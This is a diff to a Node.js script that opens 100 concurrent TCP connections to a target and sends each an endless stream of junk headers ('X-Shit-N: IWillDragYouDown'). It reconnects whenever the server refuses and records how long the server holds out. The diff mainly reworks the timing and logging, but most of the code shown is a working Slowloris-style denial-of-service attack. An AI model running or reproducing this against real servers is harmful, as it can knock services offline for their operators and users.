@@ -1,10 +1,18 @@
 const net = require('net');
-const { performance } = require('perf_hooks');
+const { PerformanceObserver, performance } = require('perf_hooks');
 const uuidv4 = require('uuid/v4');
 const { argv } = require('yargs');
 
 // Handle a lot of simultaneous connections and hold them tight.
 const CONNECTIONS = 100;
+
+performance.clearMarks();
+const obs = new PerformanceObserver(items => {
+  const timing = items.getEntries()[0];
+  console.log(`[${timing.name}] Time passed before server refused : ${timing.duration} ms`);
+  performance.clearMarks(timing.name);
+});
+obs.observe({ entryTypes: ['measure'] });
 
 net.Socket.prototype.writeAsync = function (data) {
   return new Promise(resolve => {
@@ -19,6 +27,7 @@ class Connection {
     this.port = port;
     this.state = 'ready';
     this.socket = null;
+    this.headersCount = 0
   }
 
   go() {
@@ -28,11 +37,11 @@ class Connection {
   }
 
   end() {
+    // console.log(`Sent ${this.headersCount} headers`);
     this.state = 'end';
     const endMark = this.uuid + '-end';
     performance.mark(endMark);
-    performance.measure('time' + this.uuid, this.uuid, endMark);
-    console.log(`[${this.number}] Time passed before server refused : ${performance.getEntriesByName('time' + this.uuid)[0].duration} ms`);
+    performance.measure(this.uuid, this.uuid, endMark);
     this.go();
   }
 
@@ -50,13 +59,10 @@ class Connection {
       performance.mark(this.uuid);
 
       try {
-        for (let i = 0; i < Infinity; i++) {
+        for (this.headersCount = 0; this.headersCount < Infinity; this.headersCount++) {
           await this.socket.writeAsync(`
-            X-Shit-${i}: IWillDragYouDown
+            X-Shit-${this.headersCount}: IWillDragYouDown
           `.trim());
-          if (i > 0 && i % 3000 === 0) {
-            console.log(`[${this.number}] Sent ${i} headers`);
-          }
         }
       } catch (err) {
         this.socket.end();
